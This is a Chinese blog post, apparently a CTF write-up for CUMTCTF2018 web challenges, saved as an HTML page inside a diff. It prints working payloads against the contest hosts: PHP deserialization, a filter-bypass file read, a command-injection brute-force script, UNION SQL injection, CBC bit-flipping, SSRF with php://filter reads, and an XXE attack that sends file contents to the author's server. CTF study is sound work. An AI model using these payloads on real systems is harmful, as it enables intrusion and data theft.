@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="第一次真正意义打比赛和队友一起AK了web题很舒服 WEB签到1右键源代码 签到2扫描目录发现robots.txt 打开http://qiandao.bxsteam.xyz/robots.txt 发现flag pop首页面给了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CUMTCTF2018">
+<meta property="og:url" content="http://altmanz.cn/2018/01/14/CUMTCTF2018/index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="第一次真正意义打比赛和队友一起AK了web题很舒服 WEB签到1右键源代码 签到2扫描目录发现robots.txt 打开http://qiandao.bxsteam.xyz/robots.txt 发现flag pop首页面给了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-07-12T01:30:51.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CUMTCTF2018">
+<meta name="twitter:description" content="第一次真正意义打比赛和队友一起AK了web题很舒服 WEB签到1右键源代码 签到2扫描目录发现robots.txt 打开http://qiandao.bxsteam.xyz/robots.txt 发现flag pop首页面给了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464">
+
+
+
+
+
+
+  <link rel="canonical" href="http://altmanz.cn/2018/01/14/CUMTCTF2018/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CUMTCTF2018 | Altm4nz</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Altm4nz</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/01/14/CUMTCTF2018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Altm4nz">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Altm4nz">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CUMTCTF2018
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-01-14 00:00:00" itemprop="dateCreated datePublished" datetime="2018-01-14T00:00:00+08:00">2018-01-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-07-12 09:30:51" itemprop="dateModified" datetime="2018-07-12T09:30:51+08:00">2018-07-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第一次真正意义打比赛<br>和队友一起AK了web题<br>很舒服</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="签到1"><a href="#签到1" class="headerlink" title="签到1"></a>签到1</h3><p>右键源代码</p>
+<h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>扫描目录发现robots.txt 打开<a href="http://qiandao.bxsteam.xyz/robots.txt" target="_blank" rel="noopener">http://qiandao.bxsteam.xyz/robots.txt</a> 发现flag</p>
+<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>首页面给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span> </span></span><br><span class="line"><span class="class"></span>&#123;      </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;     </span><br><span class="line">       &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nosec</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;      </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">        <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">        &#123;              </span><br><span class="line">            <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>读代码可以想到我们的大致目标就是通过 调用__toString() 函数里的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;skyobj-&gt;read();</span><br></pre></td></tr></table></figure></p>
+<p>调动read()函数,读文件找flag。<br>大概原理就是上传的data参数在被反序列化的过程中调用_construct()<br>函数，然后直接输出对象引用时调用__toString()，调动read()达到我们的目的。</p>
+<p>直接贴代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> nosec();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nosec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$aa = <span class="keyword">new</span> sky();</span><br><span class="line">$aa= urlencode(serialize($aa));</span><br><span class="line"><span class="keyword">echo</span> $aa;</span><br></pre></td></tr></table></figure></p>
+<p>\$aa就是构造的data参数。（一定要转url编码！坑！） 把data POST上去flag就出来了。</p>
+<h3 id="what？"><a href="#what？" class="headerlink" title="what？"></a>what？</h3><p>php混淆，解就行了。。没啥说的 解出来的关键代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$IIIIIIIIIIll = @$_GET[&apos;img_tet&apos;]; $IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll); $IIIIIIIIIIll = str_replace(&apos;flag&apos;, &quot;&quot;, $IIIIIIIIIIll);</span><br><span class="line">if ($IIIIIIIIIIll != &quot;&quot;) &#123;</span><br><span class="line">    header(&apos;Content-Type: imgage/jpeg&apos;);</span><br><span class="line">    header(&apos;Content-Disposition: attachment; filename=&apos;.$IIIIIIIIIIll);</span><br><span class="line">    header(Content-Lengh: .filesize($IIIIIIIIIIll));</span><br><span class="line">    $IIIIIIIIII11 = fopen($IIIIIIIIIIll, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">    $IIIIIIIIIlIl = fread($IIIIIIIIII11, filesize($IIIIIIIIIIll));</span><br><span class="line">    fclose($IIIIIIIIII11);</span><br><span class="line">    echo $IIIIIIIIIlIl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>过滤了flag，用flflagag绕过。 最终payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://confuse.bxsteam.xyz?img_tet=%2f%74%6d%70%2f%66%6c%66%6c%61%67%61%67</span><br></pre></td></tr></table></figure></p>
+<h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>先fuzz了一波，没发现怎么利用，提示换行后fuzz，还是不会。 最后发现了用uniq 和<br>sort指令都能做出来 %0a换行，%09绕过空格。用通配符 ‘?’ 爆破文件<br>这里直接贴上python脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url=<span class="string">'http://rce.bxsteam.xyz/index.php'</span></span><br><span class="line">payload=urllib.unquote(<span class="string">'%0auniq%09.%3f'</span>)</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    payload=urllib.unquote(urllib.quote(payload)+<span class="string">'%3f'</span>)</span><br><span class="line">    data=&#123;</span><br><span class="line">    <span class="string">"rce"</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p>
+<p>其中把uniq换成sort也可以。</p>
+<h3 id="skysql"><a href="#skysql" class="headerlink" title="skysql"></a>skysql</h3><p>sky的sql是真的难。 刚开始想通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;||(select user() like &apos;%&apos;)||&apos;0</span><br></pre></td></tr></table></figure></p>
+<p>构造 1 然后通配符逐字爆破。。结果发get不到列名。。就卡住了 提示用联合查询 ，<br>union select 用 union all select select 1，2等价于 select * from ((select 1)A join (select 2)B) 构造出来payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union all select * from ((select 1)A join (select 2)B)%23</span><br></pre></td></tr></table></figure></p>
+<p>但还是找不到列名，百度到大佬的博客讲不用列名的奇淫技巧。。<br><a href="http://www.blogsir.com.cn/safe/495.html" target="_blank" rel="noopener">http://www.blogsir.com.cn/safe/495.html</a><br>limit(0,1) 用 limit 1 offset 0<br>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union all select * from ((select 1)A join (select F.1 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23</span><br></pre></td></tr></table></figure></p>
+<p>F.n读取第n列 最终在第四列读到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysql.bxsteam.xyz/?id=0&apos; union all select * from ((select 1)A join (select F.4 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23</span><br></pre></td></tr></table></figure></p>
+<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>首先发现源码<a href="http://cbc.bxsteam.xyz/login.php" target="_blank" rel="noopener">http://cbc.bxsteam.xyz/login.php</a>~<br>分析后得知是CBC反转攻击。不懂看这里（<a href="http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html）" target="_blank" rel="noopener">http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html）</a><br>不能直接用admin登陆，需要我们更改cipher和token以达到用admin登陆的目的。<br>我们用1dmin和任意密码登陆 得到cipher和token的值<br>这里进行CBC反转攻击，得到新的cipher和token值<br>python脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">iv = base64.b64decode(<span class="string">"cFvSSjVIp+Uh22ERLFjaUQ=="</span>)</span><br><span class="line">plain = base64.b64decode(<span class="string">"wPiTIz61Ge31LPnnlD1aym1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE6IjEiO30="</span>)</span><br><span class="line">want = <span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(want[0])</span></span><br><span class="line">first_16 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">print</span> i,plain[i],iv[i],want[i]</span><br><span class="line">    <span class="keyword">print</span> chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line">    first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line"></span><br><span class="line">new_iv = first_16 + iv[<span class="number">16</span>:]</span><br><span class="line">print(base64.b64encode(new_iv))</span><br><span class="line">print(first_16)</span><br></pre></td></tr></table></figure></p>
+<p>传入网页后成功跳转到amdin界面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cbc.bxsteam.xyz/admin.php?url=http://skysec.top/</span><br></pre></td></tr></table></figure></p>
+<p>默认访问了方方土的博客。。。。<br>显然是SSRF<br>我们直接读取host<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cbc.bxsteam.xyz/admin.php?url=File:///etc/hosts</span><br></pre></td></tr></table></figure></p>
+<p>得到ip：172.17.0.4<br>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cbc.bxsteam.xyz/admin.php?url=172.17.0.4</span><br></pre></td></tr></table></figure></p>
+<p>发现页面源码，明显的文件包含漏洞 直接读取flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cbc.bxsteam.xyz/admin.php?url=172.17.0.4/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
+<p>得到base64后的flag.php，解码得到flag。</p>
+<h3 id="Xxe"><a href="#Xxe" class="headerlink" title="Xxe"></a>Xxe</h3><p>xxe是什么</p>
+<p>打开题目很清楚就是xxe 直接写题解了<br>首先vps放文件file.dtd,内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://104.236.236.145/?p=%payl;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>漏洞处payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://104.236.236.145/file.dtd&quot;&gt;%remote;%int;%trick;]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>查看服务器log(nginx一般在var/log/nginx/access.log)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">58.218.185.110 - - [14/Jan/2018:08:16:55 +0000] &quot;GET /?p=(省略一大串) HTTP/1.0&quot; 200 3 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure></p>
+<p>base64解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1 localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.17.0.6  flag 5e8af79b12ae xxessrf_flag_1</span><br><span class="line">172.17.0.6  flag_1 5e8af79b12ae xxessrf_flag_1</span><br><span class="line">172.17.0.6  xxessrf_flag_1 5e8af79b12ae</span><br><span class="line">172.17.0.7  74791d7ac29b</span><br></pre></td></tr></table></figure></p>
+<p>嗯？？？？还有一层？？？接着继续读下index<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">     </span><br><span class="line">    &lt;title&gt;XML&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./bootstrap.min.css&quot;&gt;  </span><br><span class="line">    &lt;script src=&quot;./jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form role=&quot;form&quot; id=&quot;form&quot; method=&quot;POST&quot; action=&quot;index.php&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;name&quot;&gt;XML&lt;/label&gt;</span><br><span class="line">        &lt;textarea class=&quot;form-control&quot; rows=&quot;6&quot; name=&quot;data&quot; placeholder=&quot;</span><br><span class="line">&lt;code&gt;</span><br><span class="line">    &lt;body&gt;Hello World!&lt;/body&gt;</span><br><span class="line">&lt;/code&gt; </span><br><span class="line">&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;btn-group&quot;&gt;</span><br><span class="line">    &lt;button type=&quot;button&quot; class=&quot;btn btn-default&quot; onclick=&quot;document.getElementById(&apos;form&apos;).submit()&quot;&gt;SUBMIT&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    include(&quot;flag.php&quot;);</span><br><span class="line">    if(isset($_POST[&apos;data&apos;]) and $_POST[&apos;data&apos;] != &quot;&quot;) &#123;</span><br><span class="line">        $xml = simplexml_load_string($_POST[&apos;data&apos;], null, LIBXML_NOENT);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
